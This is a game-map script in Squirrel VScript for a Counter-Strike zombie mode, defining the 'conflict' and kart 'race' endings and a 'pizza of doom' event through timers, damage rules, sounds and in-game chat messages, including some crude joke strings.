											EntFireByHandle(self,"AddOutput","rendercolor 20 100 255",0.00,null,null);
											EntFireByHandle(self,"AddOutput","glowcolor 50 200 255",0.00,null,null);
											EntFireByHandle(glow,"AddOutput","rendercolor 50 200 255",0.00,null,null);
										}
										local hp = 0.00+::ENDINGS.CONFLICT.life;
										hp = hp.tointeger();
										if(hp >= 100)
										{
											::ENDINGS.CONFLICT.ended = true;
											::ENDINGS.CONFLICT.winner = 2;
											ScriptPrintMessageCenterAll(	"[CONFLICT ENDING]"+
																			"\nZOMBIES WON - FLAG TAKEN"
																		);
											return;
										}
										if(::ENDINGS.CONFLICT.round_ended)
										{
											::ENDINGS.CONFLICT.ended = true;
											::ENDINGS.CONFLICT.winner = 2;
											ScriptPrintMessageCenterAll(	"[CONFLICT ENDING]"+
																			"\nZOMBIES WON - HUMANS DIED"
																		);
											return;
										}
										if(::ENDINGS.CONFLICT.timer_started)
											::ENDINGS.CONFLICT.time-=(::ENDINGS.CONFLICT.flag_tickrate+
												((ceil(::ENDINGS.CONFLICT.flag_tickrate/FrameTime()))*FrameTime()-::ENDINGS.CONFLICT.flag_tickrate));
										local time = 0.00+::ENDINGS.CONFLICT.time;
										time = time.tointeger();
										if(time <= 0)
										{
											::ENDINGS.CONFLICT.ended = true;
											::ENDINGS.CONFLICT.winner = 3;
											ScriptPrintMessageCenterAll(	"[CONFLICT ENDING]"+
																			"\nHUMANS WON"
																		);
											return;
										}
										local timestring = "\n";
										
										//if(::ENDINGS.CONFLICT.timer_started)timestring = "\nTime left: "+time.tostring();
										timestring = "\n                 Time left: "+time.tostring();			//__CSS__ <altered text:
										
										
										//__CSS__ altered text:
										ScriptPrintMessageCenterAll(	"                           [CONFLICT ENDING]"+
																		"\n(defend the flag, z-dmg on-touch, crouchjump to go higher)"+
																		timestring+
																		"    |    Flag capture: "+hp.tostring()+"%"+
																		state//+
																		
																		//__CSS__ added extra lines on the bottom to make the text go higher
																		//--- nah, this shit borks the text on lower resolutions, keep it centered
																		//"\n\n\n\n\n\n\n\n\n\n"
																	);
										
										//__CSS__ og text below:
										/*
										ScriptPrintMessageCenterAll(	"[CONFLICT ENDING]"+
																		"\n(Z win by flag capture / killing all humans)"+
																		"\n(No human infection - only hurt by touch)"+
																		"\n(Crouch jump to go higher)"+
																		"\n----------------------------------"+
																		timestring+
																		"\nFlag capture: "+hp.tostring()+"%"+
																		state
																	);
										*/
										
										::GetPlayerCount(); // updates the cached CT-count value if needed
										local hpcap = (0+::ENDINGS.CONFLICT.zhp_base+(::ENDINGS.CONFLICT.zhp_each_ct*::getplayercount_cache_ct));
										if(hpcap < 1)hpcap = 1;
										local ctlist = [];
										local tlist = [];
										for(local h;h=Entities.FindByClassname(h,"player");)
										{
											if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
											if(h.GetTeam()==3)
											{
												ctlist.push(h);
												EntFireByHandle(h,"RunScriptCode","invinciblehuman<-true;",0.00,null,null);
												continue;
											}
											if(h.GetTeam()!=2)continue;
											tlist.push(h);
											
											EntFireByHandle(h,"AddContext","safezombie:1",0.00,null,null);
											h.ValidateScriptScope();h.GetScriptScope().safezombie <- true;
											
											if(h.GetHealth()<=hpcap)continue;
											h.SetHealth(hpcap);
										}
										foreach(ct in ctlist)
										{
											local dmg = 0;
											local tcand = [];
											foreach(t in tlist)
											{
												if(::GetDistance(ct.GetOrigin(),t.GetOrigin()) <= ::ENDINGS.CONFLICT.ztouchdmg_range)
												{
													tcand.push(t);
													dmg += ::ENDINGS.CONFLICT.ztouchdmg_damage;
													if(::ENDINGS.CONFLICT.ztouchdmg_once)
														break;
												}
											}
											if(dmg<=0)continue;
												//NEW IN v1_9 - killcredit to a random T who touches/kills the human in question
											local rtc = tcand[RandomInt(0,tcand.len()-1)];
											::HurtPlayer(ct,dmg,rtc.GetOrigin()+Vector(0,0,RandomInt(0,50)),RandomInt(50,200),rtc,"bignades");
													//OLD
												//EntFireByHandle(ct,"SetHealth",(ct.GetHealth()-dmg).tostring(),0.00,null,null);
										}
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","Tick();",4.00,null,null);		//0.30 delay in v1_7
										EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
										EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
										::Ent(self.GetOrigin()+Vector(0,0,10),Vector(),"prop_dynamic",{
												model="models/luffaren/floor_indicator.mdl",
												rendermode = 3,
												renderamt = 255,
												rendercolor = "50 200 255",
												modelscale = 0.970,
											},{
											master = self,
											function Run(){
												EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
												master.GetScriptScope().glow = self;
											}});
									}});
							}});
						pqd.push({qrate=0.25,		//__CSS__ og qrate was 0.05, but slower now for performance
							function Run(){
								local pq = [];
								foreach(item in ::ENDINGS.CONFLICT.items_human)
								{
									local tile_idx = RandomInt(0,::ENDINGS.CONFLICT.tiles_human.len()-1);
									local tile_pos = ::ENDINGS.CONFLICT.tiles_human[tile_idx];
									::ENDINGS.CONFLICT.tiles_human.remove(tile_idx);
									pq.push({tile_pos=tile_pos,item=item,function Run(){::ITEMS[this.item].Spawn(this.tile_pos+Vector(0,0,40));}});
								}
								::Process(pq,0.05);
							}});
						pqd.push({qrate=0.25,		//__CSS__ og qrate was 0.05, but slower now for performance
							function Run(){
								local pq = [];
								foreach(item in ::ENDINGS.CONFLICT.items_zombie)
								{
									local tile_idx = RandomInt(0,::ENDINGS.CONFLICT.tiles_zombie.len()-1);
									local tile_pos = ::ENDINGS.CONFLICT.tiles_zombie[tile_idx];
									::ENDINGS.CONFLICT.tiles_zombie.remove(tile_idx);
									pq.push({tile_pos=tile_pos,item=item,function Run(){
										if(this.item!="rift")
											::ITEMS[this.item].Spawn(this.tile_pos+Vector(0,0,40));
										else
											::ITEMS[this.item].Spawn(this.tile_pos+Vector(0,0,40),false);
									}});
								}
								::Process(pq,0.05);
							}});
						::Process(pqd,0.00);
					}},
				RACE={	cancel_mapspawn=false,		movetp_clean=true,
						win_time = 143.00,			//- ~23s of start/dry time,		143.00 = 120s of race time
						z_hpcap = 10000,
						debris_damage = 29,
						htmlprint = true,
							//--- overrides for ::TRAPS.kart jihad vars during this ending (just do 'null' to ignore/keep default):
								jihad_override_enabled = true,
								jihad_override_range = 90,
								jihad_override_magnitude = 1500,
								jihad_override_override = 400,
					started = false,
					round_ended = false,
					startpoint = Vector(),
					startdir = Vector(),
					startrot = Vector(),
					startdirleft = Vector(),
					slay_below_ctcount = 4,				//__CSS__ when the race starts, auto-slay if human-count is <= this, no solorat shit
					slay_below_ctcount_runcount = 20,	//__CSS__ only slay if the server has >= this players
					printinfo = false,
					safe_jihad_aoe = false,		//NEW IN V1_9 - prevents jihad from creating an actual env_explosion for AoE-damage	(true at start, false after 10 seconds)
					tpback_fallen_z = false,	//NEW IN V1_9 - grace-period for zombies falling down, TP's them back up again		(true at start, false after 20 seconds)
					function EndWin(){
						EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",20.00,null);
						if(round_ended)return;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2)continue;
							::HurtPlayer(h,true);
						}
					},function TickStageImages(){
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.TickStageImages();",0.50,null);
						noprint = false;
						HTMLPRINTPOST();
					},
					function Tick(){
						if(round_ended)return;
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.Tick();",0.50,null);
						::manager.GetScriptScope().finalerubble_touchdamage = (0+::ENDINGS.RACE.debris_damage);
						::manager.GetScriptScope().finalerubble_rate_min = 0.12;
						::manager.GetScriptScope().finalerubble_rate_max = 0.15;
						::manager.GetScriptScope().finalerubble_lifetime = 4.00;
						::manager.GetScriptScope().finalerubble_random_bounds = Vector(4000,4000,800);
						if(printinfo && !::TRAPS.kart.new_controls)
						{
							local jumpinfo = "";
							if(::TRAPS.kart.enable_jumping)jumpinfo = "\n Look straight up to jump (slowdown+cooldown)";
							ScriptPrintMessageCenterAll(	"[CONTROL BY MOUSE ONLY]"+
															"\n Look upwards/center-height to accelerate"+
															"\n Look downwards to slow down"+
															"\n Look sideways to turn (relative to kart-rotation)"+
															jumpinfo+
															"\n Look straight down to get off (locked for this ending)"
														);
						}
					},function StartSpawn(){
						local emsg = Entities.CreateByClassname("point_worldtext");
							emsg.SetOrigin(startpoint+(startdir*2000)+(startdirleft*(500))+Vector(0,0,175));
							emsg.SetForwardVector(startdir);
							emsg.__KeyValueFromString("message","GO THIS WAY");
							emsg.__KeyValueFromInt("textsize",160);
							emsg.__KeyValueFromVector("color",Vector(255,255,255));
						EntFireByHandle(emsg,"Kill","",20.00,null,null);
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
							if(h.GetTeam()==3)h.SetOrigin(startpoint+(startdir*1320)+(startdirleft*(RandomFloat(-280,280))));
							else if(h.GetTeam()==2)h.SetOrigin(startpoint+(startdir*0)+(startdirleft*(RandomFloat(-280,280))));
							h.SetAngles(0,startrot.y,0);
							::TRAPS.kart.Spawn(h.GetOrigin()+Vector(0,0,6),startrot,h,true);
							local sty = 0+startrot.y.tointeger().tostring();
							
							if(!::TRAPS.kart.new_controls)
							{
								for(local ii=0.50;ii<6.00;ii+=0.50)					//NEW IN V1_9 - force-set the angle to the race-direction for a few ticks
								{
									EntFireByHandle(h,"RunScriptCode","self.SetAngles(0,90,0);",ii,null,null);
									EntFireByHandle(h,"RunScriptCode","self.GetMoveParent().SetAngles(0,"+sty+",0);",ii,null,null);
								}
							}
						}
					},function ScanStartPoint(){
						startpoint = ::tpdest.GetOrigin()+Vector(0,0,0);
						startdir = ::tpdest.GetForwardVector();
						startrot = ::tpdest.GetAngles();
						startdirleft = ::AnglesToDir(::DirToAngles(startdir)+Vector(0,90,0));
							//printl("STARTPOINT:   "+startpoint);
							//DebugDrawBox(startpoint,Vector(-10,-10,-10),Vector(10,10,10),255,0,0,255,10.00);
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.StartSpawn();",1.00,null);
					},function Run(){
						::delay_check_enabled = false;
						started = true;
						::EnableMapImages();
						::TRAPS.kart.z_hpcap = (0+::ENDINGS.RACE.z_hpcap);
						::TRAPS.kart.lock_getoff = true;
						local tofs = 5.00;		//timeoffset
						EntFire("kart","RunScriptCode","Clean();",0.00,null);
						EntFire("item_*","Kill","",0.00,null);
						EntFire("i_*","Kill","",0.00,null);
						if(jihad_override_enabled != null)::TRAPS.kart.jihad_enabled = jihad_override_enabled;
						if(jihad_override_range != null)::TRAPS.kart.jihad_range = jihad_override_range;
						if(jihad_override_magnitude != null)::TRAPS.kart.jihad_magnitude = jihad_override_magnitude;
						if(jihad_override_override != null)::TRAPS.kart.jihad_override = jihad_override_override;
						local fade = Entities.CreateByClassname("env_fade");
						EntFireByHandle(fade,"AddOutput","duration 3.00",0.00,null,null);
						EntFireByHandle(fade,"AddOutput","ReverseFadeDuration 3.00",0.00,null,null);
						EntFireByHandle(fade,"AddOutput","holdtime "+(13.00+tofs).tostring(),0.00,null,null);
						EntFireByHandle(fade,"AddOutput","spawnflags 1",0.00,null,null);
						EntFireByHandle(fade,"AddOutput","rendercolor 0 0 0",0.00,null,null);
						EntFireByHandle(fade,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(fade,"Fade","",0.02,null,null);
						EntFireByHandle(fade,"Kill","",15.00+tofs,null,null);
						if(::THEME=="hell") //hell theme be kinda like shit with the glows and stuff gotta disable it hardcode (during fade)
						{
							EntFire("skybox_slave","AddOutput","glowenabled 0",0.00,null);
							EntFire("skybox_slave","AddOutput","glowenabled 1",13.5+tofs,null);
						}
						
						
						
						
						
						//__CSS__ slay if there's not enough humans - no solorat shit
						if(::GetPlayerCount() >= ::ENDINGS.RACE.slay_below_ctcount_runcount)
						{
							local alive_cts = [];
							for(local h;h=Entities.FindByClassname(h,"player");){
								if(h==null || !h.IsValid() || !h.IsAlive() || h.GetTeam()!=3)continue;
								alive_cts.push(h);
							}
							if(alive_cts.len() <= ::ENDINGS.RACE.slay_below_ctcount)
							{
								foreach(h in alive_cts)
									::HurtPlayer(h,true);
								::ServerSay("say [RACE ENDING] not enough humans to start - YOU LOST!",0.00,null);
								::ServerSay("say [RACE ENDING] not enough humans to start - YOU LOST!",0.01,null);
								::ServerSay("say [RACE ENDING] not enough humans to start - YOU LOST!",0.02,null);
								::ServerSay("say [RACE ENDING] not enough humans to start - YOU LOST!",0.03,null);
								::ServerSay("say [RACE ENDING] not enough humans to start - YOU LOST!",0.04,null);
								return;
							}
						}
						
						
						
						
						
						//__CSS__ og in lines below was: '(0.00+win_time-80.00);if(ii>0.00)'
						
						local ii=(tofs+win_time-80.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 80s\",0.00,null);",ii,null);
						ii=(tofs+win_time-60.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 60s\",0.00,null);",ii,null);
						ii=(tofs+win_time-30.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 30s\",0.00,null);",ii,null);
						ii=(tofs+win_time-10.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 10s\",0.00,null);",ii,null);
						ii=(tofs+win_time-5.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 5s\",0.00,null);",ii,null);
						ii=(tofs+win_time-4.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 4s\",0.00,null);",ii,null);
						ii=(tofs+win_time-3.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 3s\",0.00,null);",ii,null);
						ii=(tofs+win_time-2.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 2s\",0.00,null);",ii,null);
						ii=(tofs+win_time-1.00);if(ii>0.00)
							EntFire("manager","RunScriptCode","if(!::ENDINGS.RACE.round_ended)EntFire(\"server\",\"Command\",\"say [RACE ENDING] HUMAN-WIN IN 1s\",0.00,null);",ii,null);
						foreach(k,v in ::THEMES)
						{
							local type = ["PLATFORM","FLOOR","FLOORCEILING","FLOORCEILINGTALL","PLATFORM_BRIDGE"];
							local variant = ["main","slope","slopehalf"];
							foreach(_t in type)
							{
								if(_t=="PLATFORM_BRIDGE")
								{
									::TILEVARIANTS[_t][k].main.clear();
									::TILEVARIANTS[_t][k].main.push(::TILEVARIANTS.ELEVATORBIG[k].main[0]);
									continue;
								}
								foreach(_v in variant)
								{
									::TILEVARIANTS[_t][k][_v].clear();
									::TILEVARIANTS[_t][k][_v].push(::TILEVARIANTS.ELEVATORBIG[k].main[0]);
								}
							}
						}
						::manager.GetScriptScope().mapspawnindex = 1;
						::TPmovequeue.clear();
						::TPenableindex = 0;		//new in V1_8 - this is the fix for the V1_7 edict crash, without it stages don't de-spawn
						EntFire("block_*","Kill","",3.95,null);
						EntFire("manager","RunScriptCode","mapspawnindex = 20;",3.30,null);
						EntFire("temcleaner_vscript","RunScriptCode","RunClean();",3.50,null);
						EntFire("manager","RunScriptCode","mapspawnindex = 1;",3.70,null);
						EntFire("manager","RunScriptCode"," GenerateNextMap(); ",4.00,null);
						EntFire("manager","RunScriptCode"," GenerateNextMap(); ",8.00,null);
						EntFire("manager","RunScriptCode"," noprint = false; ",9.80,null);
						EntFire("manager","RunScriptCode"," ::ENDINGS.RACE.TickStageImages(); ",10.01,null);
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.ScanStartPoint();",tofs+11.00,null);
						if(htmlprint)EntFire("manager","RunScriptCode"," noprint = false; ",tofs+16.50,null);
						EntFire("manager","RunScriptCode"," ::ENDINDICATOR_ENABLE = true; ",13.00,null);
						EntFire("manager","RunScriptCode"," BUFFER_SIZE = 0; ",tofs+12.00,null);
						EntFire("manager","RunScriptCode"," MAX_AREA_HISTORY=2;stage_end_pos_range=2400;"+
							"stage_end_pos_allowdifh=true;::NEXTMAPGEN_TIME_OVERRIDE=0.05; ",tofs+9.00,null);
						EntFire("manager","RunScriptCode"," TickStageEndPos_DISABLEFORCE = false; ",tofs+12.00,null);
						::manager.GetScriptScope().EDGE_WARNING = 1000;		//new in V1_8 - tighter limit due to different sizes (OG:7000)
						::manager.GetScriptScope().EDGE_LIMIT = 3000;		//new in V1_8 - tighter limit due to different sizes (OG:10000)
						::manager.GetScriptScope().pos = Vector();			//new in V1_8 - resets pos
						::TRAPS.kart.enable_jumping = false;				//new in V1_8 - disables kart-jumping by looking up
						::manager.GetScriptScope().TickStageEndPos_COOLDOWN = true;
						::manager.GetScriptScope().TickStageEndPos_DISABLEFORCE = true;
						::STAGEFILTER_RACE = true;
						::SPAWNFADE_ALPHA_TADD = 0.03;
						::SPAWNFADE_ALPHA_ADD = 50;
						::manager.GetScriptScope().stage_end_pos_mustbeinstage = true;
						::manager.GetScriptScope().AREAFADE_DELAY = 0.00;
						::manager.GetScriptScope().AREAFADE_SPEED = 50;
						::manager.GetScriptScope().AREAFADE_SPEEDT = 0.05;
						::manager.GetScriptScope().TP_DELAY = 0.05;
						::OPEN_HOLDS_ON_NEWSTAGE = false;
						::manager.GetScriptScope().event_cooldown = 99999;
						::manager.GetScriptScope().GRID_SIZE = 188;
						::manager.GetScriptScope().MAX_AREA_HISTORY = 1;
						::manager.GetScriptScope().AREA_BBOX_TEST = true;
						::DISABLE_H_ITEMS = true;
						::DISABLE_Z_ITEMS = true;
						::DISABLE_TRAPS = true;
						::DISABLE_TRAPFLOORS = true;
						::manager.GetScriptScope().BUFFER_SIZE = 10;
						::SKIPSAFE = null;
						::SKIPSAFE_SIDES = null;
						::ANGLE_SLOPE_RACE = true;
						::FORCE_RENDERMODE9 = true;
						::ENDINDICATOR_ENABLE = false;
						EntFire("tpdest_indicator","AddOutput","glowenabled 0",tofs+0.00,null);
						EntFire("tpdest_indicator","AddOutput","renderamt 0",tofs+0.00,null);
						EntFire("tpdest_indicator","AddOutput","rendercolor 0 0 0 0",tofs+0.00,null);
						EntFire("tpdest_indicator","Disable","",tofs+0.00,null);
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.Tick();",tofs+0.35,null);
						
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.EndWin();",tofs+win_time,null);
						
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.printinfo=true;",tofs+0.30,null);
						EntFire("manager","RunScriptCode","::ENDINGS.RACE.printinfo=false;",tofs+30.00,null);
						::ServerSay("say [RACE ENDING]",tofs+0.00,null);
						::ServerSay("say [RACE ENDING]",tofs+0.01,null);
						::ServerSay("say [RACE ENDING]",tofs+0.02,null);
						::ServerSay("say [RACE ENDING] prepare to race...",tofs+1.03,null);
						::ServerSay("say [RACE ENDING] survive for "+(win_time-23.00).tostring()+"s (or z-team-death) to win",tofs+2.04,null);
						::ServerSay("say [RACE ENDING] zombies jihad-explode if they touch you",tofs+3.05,null);
						::ServerSay("say [RACE ENDING] drive fast to stay away from them",tofs+4.06,null);
						::ServerSay("say [RACE ENDING] may only the best racist win!",tofs+5.07,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner==3)
								{
									::ServerSay("say [RACE ENDING] YOU WON!",0.00,null);
									::ServerSay("say [RACE ENDING] YOU ARE TRUE RACISTS!",1.01,null);
									printl("[RACE ENDING] YOU WON!");
									::RoundWon();
								}
								else
									::ServerSay("say [RACE ENDING] YOU LOST!",0.00,null);
								::ENDINGS.RACE.round_ended = true;
								::Sound("*luffaren/kart_win.mp3",Vector(),null,0,3.00,100,10);
								EntFire("manager","RunScriptCode","::Sound(\"*luffaren/mk64_firstplace.mp3\",Vector(),null,0,10.00,100,10);",1.90,null);
								EntFire("ending_race_music","StopSound","",0.05,null);
								EntFire("ending_race_music","Volume","0",0.05,null);
								EntFire("ending_race_music","Kill","",0.20,null);
							}});
							local pq = [];
								pq.push({qrate=0.30,function Run(){::Sound("*luffaren/letsago.mp3",Vector(),null,0,1.00,100,10);
									EntFire("manager","RunScriptCode","EnableSpawnKiller();",0.00,null);}});
								pq.push({qrate=4.00,function Run(){
										for(local h;h=Entities.FindByClassname(h,"player");)
										{
											if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
											if(h.GetTeam()==3)h.SetOrigin(Vector(16000,RandomInt(-10000,10000),15800));
											else if(h.GetTeam()==2)h.SetOrigin(Vector(-16000,RandomInt(-10000,10000),15800));
											EntFireByHandle(h,"ClearParent","",0.00,null,null);
											EntFireByHandle(h,"AddOutput","movetype 0",0.00,null,null);
											EntFireByHandle(h,"AddOutput","movetype 0",0.10,null,null);
											EntFireByHandle(h,"AddOutput","movetype 0",0.20,null,null);
										}
									}});
								pq.push({qrate=9.00+tofs,function Run(){}});
								pq.push({qrate=6.80,function Run(){
										if(::ENABLE_ENDING_MUSIC)
											::Sound("*luffaren/mk64_racestart.wav",Vector(),null,0,1.00,100,10);
									}});
								pq.push({qrate=1.00,function Run(){::Sound("*luffaren/kart_start_1.mp3",Vector(),null,0,1.00,100,10);}});
								pq.push({qrate=1.00,function Run(){::Sound("*luffaren/kart_start_1.mp3",Vector(),null,0,1.00,100,10);}});
								pq.push({qrate=0.01,function Run(){::Sound("*luffaren/kart_start_2.mp3",Vector(),null,0,1.00,100,10);
										EntFire("manager","RunScriptCode"," finalerubble_ticking++; ",0.00,null);
										EntFire("kart","AddOutput","movetype 3",0.00,null);
										EntFire("kart","RunScriptCode","self.SetVelocity(Vector());",0.00,null);
										EntFire("kart","RunScriptCode","jumpcd=0.00;",0.00,null);
										EntFire("kart","AddOutput","movetype 3",0.50,null);
										EntFire("telehurt","AddOutput","origin 0 0 -12070",0.00,null);	//NEW IN V1_9 - more forgiving for T's at the start
										EntFire("telehurt","AddOutput","origin 0 0 -12070",0.50,null);
										EntFire("telehurt","AddOutput","origin 0 0 -12070",5.00,null);
										EntFire("manager","RunScriptCode","::ENDINGS.RACE.safe_jihad_aoe = true;",0.00,null);
										EntFire("manager","RunScriptCode","::ENDINGS.RACE.safe_jihad_aoe = false;",10.00,null);
										EntFire("manager","RunScriptCode","::ENDINGS.RACE.tpback_fallen_z = true;",0.00,null);
										EntFire("manager","RunScriptCode","::ENDINGS.RACE.tpback_fallen_z = false;",20.00,null);
										::manager.GetScriptScope().TickStageEndPos_COOLDOWN = false;
									}});
							if(::ENABLE_ENDING_MUSIC)
							{
								for(local i=0;i<20;i++){
									pq.push({qrate=78.20,function Run(){
											if(::ENDINGS.RACE.round_ended)return;
											::Sound("#music/luffaren_collective/toads_turnpike.mp3",Vector(),null,0,85.00,100,10,
												{function Run(){soundhandle.__KeyValueFromString("targetname","ending_race_music");}});
										}});}
							}
							::Process(pq,0.05);
					}},
};
scandt <- PlayerInstanceFromIndex(1);
/*-----------------------------------------------------------------//DEV SHIT
EntFire("manager","RunScriptCode"," time_for_end=true;noprint=true;GenerateNextMap(); ",8.00,null);
try{::stage = null;}catch(e){}
::ENDING_DEBUG=true;
::ENDINGS <- {
				XXXXXXXXXX={	cancel_mapspawn=false,		movetp_clean=true,
					function Run(){
						::delay_check_enabled = false;
						//.....
					}},
}
-----------------------------------------------------------------*/

::EVENTS <- {
			//XXXXXXXXXX={		cost=0,			cancel_mapspawn=false,		allow_in_finale=false,
			//	function Run(){
			//		//.....
			//	}},
			PIZZADOOM={		cost=0,			cancel_mapspawn=false,		allow_in_finale=true,//only during finale endrun though (boss tower/height will fuck shit up)
						runtime_min = 12.00,
						runtime_max = 35.00,
						spawn_height = 4500,
						speed = 50,
						hp_base = 500,
						hp_each_ct = 1200,
						sound_stack = 5,
						fxlimit = 5,
					fxamt = 0,
					active=false,
					function RunReal(){
						local cand = null;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false||h.GetOrigin().z < -5000)continue;
							cand = h;
							break;
						}
						if(cand==null)
						{
							active = false;
							return;
						}
						::ServerSay("say ***WHAT IS THAT...?***",0.70,null);
						::ServerSay("say ***LOOK UP!***",6.00,null);
						::ServerSay("say ***LOOK UP!***",6.01,null);
						::ServerSay("say ***LOOK UP!***",6.02,null);
						::ServerSay("say ***THE PIZZA OF DOOM IS COMING OUR WAY***",9.00,null);
						::ServerSay("say ***THE PIZZA OF DOOM IS COMING OUR WAY***",9.01,null);
						::ServerSay("say ***THE PIZZA OF DOOM IS COMING OUR WAY***",9.02,null);
						::ServerSay("say ***SHOOT IT OR PERISH***",11.00,null);
						::ServerSay("say ***SHOOT IT OR PERISH***",11.01,null);
						::ServerSay("say ***SHOOT IT OR PERISH***",11.02,null);
						local spos = cand.GetOrigin()+Vector(0,0,spawn_height);
						if(spos.z > 16000)spos.z = 16000;
						::Ent(spos,Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
								model="models/luffaren/pizza.mdl",
								modelscale = 1.01,
								rendermode = 1,
								rendercolor = "200 120 120 255",
								targetname = "pizzadoom",
							},{
							sounds = [],
							tickingscale = true,
							scale = 10.01,
							broken=false,
							function Broken(){
								if(broken)return;
								broken = true;
								EntFireByHandle(self,"AddOutput","rendercolor 100 50 50 255",0.00,null,null);
								::ServerSay("say ***WE DID IT***",0.00,null);
								::ServerSay("say ***WE DID IT***",0.01,null);
								::ServerSay("say ***WE DID IT***",0.02,null);
								::ServerSay("say ***THE PIZZA OF DOOM IS FLYING AWAY***",1.03,null);
								::ServerSay("say ***THE PIZZA OF DOOM IS FLYING AWAY***",1.04,null);
								::ServerSay("say ***THE PIZZA OF DOOM IS FLYING AWAY***",1.05,null);
								::ServerSay("say ***WE ARE FINALLY SAFE***",2.06,null);
								::ServerSay("say ***WE ARE FINALLY SAFE***",2.07,null);
								::ServerSay("say ***WE ARE FINALLY SAFE***",2.08,null);
								foreach(s in sounds)
								{
									if(s==null||!s.IsValid())continue;
									local ii = 0.00;
									for(local pitch=50;pitch<200;pitch+=2)
									{
										EntFireByHandle(s,"Pitch",pitch.tostring(),ii,null,null);
										ii += 0.10;
									}
								}
								EntFireByHandle(self.GetMoveParent().GetMoveParent(),"Close","",0.00,null,null);
							},function TickScale(){
								if(!tickingscale)
								{
									foreach(s in sounds)
									{
										if(s==null||!s.IsValid())continue;
										EntFireByHandle(s,"StopSound","",0.00,null,null);
										EntFireByHandle(s,"Volume","0",0.00,null,null);
										EntFireByHandle(s,"Kill","",0.10,null,null);
									}
									sounds.clear();
									EntFireByHandle(self.GetMoveParent().GetMoveParent(),"Kill","",0.00,null,null);
									return;
								}
								EntFireByHandle(self,"RunScriptCode","TickScale();",0.01,null,null);
								if(!broken)
								{
									scale += (0.001*scale);
									//if(scale>=30000)scale = 30000;		//__CSS__ og csgo
									if(scale>=100)scale = 100;
								}
								else
								{
									scale -= (0.005*scale);
									if(scale<=0.01)
									{
										scale = 0.01;
										tickingscale = false;
									}
									else if(scale <= 3)
									{
										foreach(s in sounds)
										{
											if(s==null||!s.IsValid())continue;
											EntFireByHandle(s,"StopSound","",0.00,null,null);
											EntFireByHandle(s,"Volume","0",0.00,null,null);
											EntFireByHandle(s,"Kill","",0.10,null,null);
										}
										sounds.clear();
									}
								}
								//self.__KeyValueFromFloat("modelscale",scale);
								::NetProps.SetPropFloat(self,"m_flModelScale",scale);
							},function Run(){
								EntFireByHandle(self,"RunScriptCode","TickScale();",0.01,null,null);
								local hpset = (0+::EVENTS.PIZZADOOM.hp_base);
								for(local h;h=Entities.FindByClassname(h,"player");)
								{
									if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
									hpset += ::EVENTS.PIZZADOOM.hp_each_ct;
								}
								::Hitbox(self.GetOrigin(),self.GetAngles(),hpset,Vector(-30000,-30000,-4),Vector(30000,30000,4),"filter_ct",false,{
									master = self,
									function Act(index,attackerhandle){
										if(index==1)EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,master,null);
										if(index==3)EntFireByHandle(master,"RunScriptCode","Broken();",0.00,null,null);
									}},"hitbox_pizzadoom");
								for(local i=0;i<3;i++)
								{
									local radius = 1000000;
									if(i==1)radius = 0;
									::Sound("*luffaren/pizzadoom.mp3",Vector(0,0,RandomFloat(-1.00,1.00)),self,radius,500.00,50,100,{
										master = self,
										function Run(){
											master.GetScriptScope().sounds.push(soundhandle);
											soundhandle.__KeyValueFromString("targetname","pizzadoom_sound");
										}});
								}
								::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
										spawnflags = 1,
										filtername = "filter_ct",
										targetname = "pizzadoom",
									},{
									model = self,
									function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										::ServerSay("say ***THE PIZZA IS AGGRESSIVE***",1.55,null);
										EntFireByHandle(toucher,"SetHealth","-1",0.00,null,null);
